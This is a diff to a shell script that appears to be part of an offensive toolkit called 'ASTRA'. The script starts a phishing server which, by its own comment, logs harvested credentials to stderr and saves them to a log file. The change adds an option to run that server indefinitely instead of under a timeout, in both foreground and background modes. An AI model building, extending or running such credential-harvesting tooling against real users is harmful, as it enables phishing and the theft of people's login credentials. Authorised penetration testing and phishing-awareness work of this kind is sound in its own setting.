@@ -227,10 +227,18 @@ EOF
 
 if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
     # FOREGROUND — python server logs credentials to stderr; 2>&1 captures it in tee
-    ( cd "$PHISH_DIR" && timeout --foreground "$SCAN_TIME" python3 server.py 2>&1 | tee "$SERVER_LOG" || true )
+    if [[ "${ASTRA_INDEFINITE:-}" == "true" ]]; then
+        ( cd "$PHISH_DIR" && python3 server.py 2>&1 | tee "$SERVER_LOG" || true )
+    else
+        ( cd "$PHISH_DIR" && timeout --foreground "$SCAN_TIME" python3 server.py 2>&1 | tee "$SERVER_LOG" || true )
+    fi
 else
-    # BACKGROUND: bound python server with timeout so wait does not block indefinitely
-    ( cd "$PHISH_DIR" && timeout "$SCAN_TIME" python3 server.py > "$SERVER_LOG" 2>&1 ) &
+    # BACKGROUND
+    if [[ "${ASTRA_INDEFINITE:-}" == "true" ]]; then
+        ( cd "$PHISH_DIR" && python3 server.py > "$SERVER_LOG" 2>&1 ) &
+    else
+        ( cd "$PHISH_DIR" && timeout "$SCAN_TIME" python3 server.py > "$SERVER_LOG" 2>&1 ) &
+    fi
     HTTP_PID=$!
     wait "$HTTP_PID" 2>/dev/null || true
 fi
